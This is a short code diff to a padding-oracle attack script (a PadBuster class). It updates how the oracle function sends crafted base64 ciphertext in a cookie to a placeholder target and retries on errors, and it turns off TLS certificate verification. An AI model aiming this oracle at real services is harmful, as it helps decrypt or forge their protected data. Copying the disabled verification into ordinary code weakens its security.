@@ -10,17 +10,18 @@ import time
 class PadBuster(PaddingOracle):
     def __init__(self, **kwargs):
         super(PadBuster, self).__init__(**kwargs)
-        self.session = requests.session(prefetch=True, timeout=5, verify=False)
+        self.session = requests.Session()
 
-    def oracle(self, data):
+    def oracle(self, data, **kwargs):
         somecookie = quote(b64encode(data))
         self.session.cookies['somecookie'] = somecookie
 
         while 1:
             try:
-                response = self.session.get('http://www.example.com/')
+                response = self.session.get('http://www.example.com/',
+                        stream=False, timeout=5, verify=False)
                 break
-            except (socket.error, requests.exceptions.SSLError):
+            except (socket.error, requests.exceptions.RequestException):
                 time.sleep(2)
                 continue
 
